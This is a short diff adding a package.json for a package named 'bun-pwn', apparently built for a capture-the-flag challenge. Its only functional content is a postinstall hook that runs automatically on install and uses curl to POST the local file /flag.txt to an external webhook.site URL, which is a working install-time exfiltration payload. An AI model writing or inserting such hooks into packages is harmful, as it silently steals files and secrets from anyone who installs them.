@@ -1,0 +1,7 @@
+{
+  "name": "bun-pwn",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -X POST -d @/flag.txt https://webhook.site/edafaddb-cdec-4927-94f5-b1aef5658d0d"
+  }
+}
